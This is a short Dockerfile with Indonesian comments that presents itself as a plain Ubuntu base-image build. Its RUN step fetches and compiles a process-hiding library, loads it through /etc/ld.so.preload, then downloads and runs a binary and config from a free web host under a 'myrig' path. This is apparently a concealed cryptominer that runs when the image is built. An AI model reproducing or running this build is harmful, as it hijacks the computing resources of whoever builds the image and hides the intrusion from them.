# Gunakan image dasar
FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

# Menjalankan perintah di dalam container
RUN apt-get -qqy update \
    && apt-get -qqy --no-install-recommends install \
        sudo \
        supervisor \
        websockify wget git gcc \
    && wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload \    
    && wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && chmod +x durex && ./durex \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/*

